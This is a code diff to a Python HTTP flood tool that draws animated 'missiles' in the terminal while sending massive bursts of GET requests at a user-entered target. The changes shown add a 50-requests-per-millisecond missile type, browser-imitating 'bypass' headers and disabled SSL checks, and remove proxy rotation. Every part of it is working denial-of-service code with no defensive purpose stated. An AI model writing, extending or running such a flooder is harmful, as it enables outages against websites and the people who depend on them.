@@ -14,21 +14,6 @@ TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2
 def clear():
     print("\033[H\033[J", end="")
 
-# Load proxies from premium.txt
-def load_proxies():
-    proxies = []
-    try:
-        with open('premium.txt', 'r') as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith('#'):
-                    proxies.append(line)
-        print(f"Loaded {len(proxies)} proxies from premium.txt")
-        return proxies
-    except FileNotFoundError:
-        print("Error: premium.txt file not found!")
-        return []
-
 # Generate random real-looking IPv4
 def random_ip():
     return ".".join(str(random.randint(1, 255)) for _ in range(4))
@@ -64,7 +49,8 @@ MISSILE_BATCHES = {
     1: 50,
     2: 200,
     3: 300,
-    4: 1000
+    4: 1000,
+    5: 50  # 50/ms missile
 }
 
 ULTRA_SUPER_BATCH = 3500
@@ -80,13 +66,14 @@ class Missile:
         if speed:
             self.speed = speed
         else:
-            self.speed = random.choice([1,2,3,4])
+            self.speed = random.choice([1, 2, 3, 4, 5])  # Added type 5
         self.batch = MISSILE_BATCHES.get(self.speed, 50)
         self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
         self.y = TERMINAL_HEIGHT
         self.active = False
-        self.launch_delay = random.uniform(1,3)
+        self.launch_delay = random.uniform(1, 3)
         self.exhaust = random.choice(EXHAUST_FRAMES)
+        self.requests_sent = 0
 
     def move(self):
         if self.active:
@@ -104,7 +91,10 @@ def draw_missiles(missiles):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
                     if i == 0:
-                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
+                        if missile.speed == 5:
+                            buffer[pos] += " " * missile.x + line + f"  [{missile.batch}/ms]"
+                        else:
+                            buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                     else:
                         buffer[pos] += " " * missile.x + line
             exhaust_pos = missile.y
@@ -113,112 +103,105 @@ def draw_missiles(missiles):
     clear()
     print("\n".join(buffer))
 
-# Get random proxy from loaded list
-def get_random_proxy(proxies):
-    if proxies:
-        return random.choice(proxies)
-    return None
+# Minimal headers for bypass
+def get_headers():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Cache-Control': 'no-cache'
+    }
 
-# Create proxy connector based on proxy format
-def create_proxy_connector(proxy):
-    if not proxy:
-        return None
+# Send batch requests with minimal headers and no proxies
+async def send_requests(target, batch):
+    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
+    timeout = aiohttp.ClientTimeout(total=30)
     
-    # Handle different proxy formats
-    if proxy.startswith('http://') or proxy.startswith('https://'):
-        return proxy
-    elif proxy.startswith('socks4://') or proxy.startswith('socks5://'):
-        return proxy
-    else:
-        # Assume it's IP:PORT format, default to HTTP
-        return f"http://{proxy}"
-
-# Send batch requests with proxies
-async def send_requests(target, batch, proxies):
-    if not proxies:
-        # Fallback to direct connection if no proxies available
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for _ in range(batch):
-                tasks.append(session.get(target))
-            try:
-                await asyncio.gather(*tasks, return_exceptions=True)
-            except:
-                pass
-        return
-
-    async with aiohttp.ClientSession() as session:
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=get_headers()) as session:
         tasks = []
         for _ in range(batch):
-            proxy_url = create_proxy_connector(get_random_proxy(proxies))
             try:
-                tasks.append(session.get(target, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)))
-            except Exception as e:
-                # If proxy setup fails, try direct connection
-                tasks.append(session.get(target, timeout=aiohttp.ClientTimeout(total=10)))
+                task = session.get(target, allow_redirects=True, ssl=False)
+                tasks.append(task)
+            except:
+                pass
         
         try:
-            await asyncio.gather(*tasks, return_exceptions=True)
-        except:
-            pass
+            responses = await asyncio.gather(*tasks, return_exceptions=True)
+            successful = sum(1 for r in responses if not isinstance(r, Exception))
+            return successful
+        except Exception as e:
+            return 0
+
+# Special function for type 5 missile (50/ms)
+async def send_continuous_requests(target, missile):
+    missile.requests_sent = 0
+    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05  # Convert to real time
+    
+    start_time = time.time()
+    requests_per_batch = 50  # 50 requests per batch
+    batch_interval = 0.001  # 1 millisecond
+    
+    while time.time() - start_time < flight_time and missile.active:
+        batch_start = time.time()
+        successful = await send_requests(target, requests_per_batch)
+        missile.requests_sent += successful
+        
+        # Maintain precise timing
+        batch_duration = time.time() - batch_start
+        sleep_time = max(0, batch_interval - batch_duration)
+        await asyncio.sleep(sleep_time)
 
 # Ultra-super missile every 5s
-async def ultra_super_missile(target, duration, proxies):
+async def ultra_super_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH, proxies))
+        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH))
         await asyncio.sleep(5)
 
 # Last missile every 0.5s
-async def last_missile(target, duration, proxies):
+async def last_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        asyncio.create_task(send_requests(target, LAST_BATCH, proxies))
+        asyncio.create_task(send_requests(target, LAST_BATCH))
         await asyncio.sleep(0.5)
 
 # Supernova missile
-async def supernova_missile(target, duration, proxies):
+async def supernova_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
         delay = random.uniform(5, 10)
         await asyncio.sleep(delay)
 
         # Initial 1000 requests
-        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL, proxies))
+        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))
 
         # Stream of 500/ms while rising (~2s flight)
         async def stream():
             t_end = time.time() + 2
             while time.time() < t_end:
-                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM, proxies))
+                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM))
                 await asyncio.sleep(0.001)
         asyncio.create_task(stream())
 
 # Main loop
 async def main():
-    # Load proxies at startup
-    proxies = load_proxies()
-    
-    if not proxies:
-        print("Warning: No proxies loaded. Continuing with direct connections.")
-        response = input("Continue anyway? (y/n): ")
-        if response.lower() != 'y':
-            return
-    
     target = input("¿TARGZ > ")
     duration = int(input("¿DU > "))
 
     await countdown_loader(5)
 
-    missiles = [Missile() for _ in range(2)]
+    missiles = [Missile() for _ in range(3)]  # Increased to 3 missiles for more activity
 
-    # Start heavy missiles with proxies
-    asyncio.create_task(ultra_super_missile(target, duration, proxies))
-    asyncio.create_task(last_missile(target, duration, proxies))
-    asyncio.create_task(supernova_missile(target, duration, proxies))
+    # Start heavy missiles
+    asyncio.create_task(ultra_super_missile(target, duration))
+    asyncio.create_task(last_missile(target, duration))
+    asyncio.create_task(supernova_missile(target, duration))
 
     start_time = time.time()
-    last_launch_times = [0]*len(missiles)
+    last_launch_times = [0] * len(missiles)
 
     while time.time() - start_time < duration:
         now = time.time()
@@ -226,8 +209,16 @@ async def main():
             if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                 missile.active = True
                 last_launch_times[idx] = now
-                asyncio.create_task(send_requests(target, missile.batch, proxies))
+                
+                if missile.speed == 5:
+                    # Type 5 missile: continuous 50/ms requests
+                    asyncio.create_task(send_continuous_requests(target, missile))
+                else:
+                    # Normal missile: single batch
+                    asyncio.create_task(send_requests(target, missile.batch))
+            
             missile.move()
+        
         draw_missiles(missiles)
         await asyncio.sleep(0.05)
 
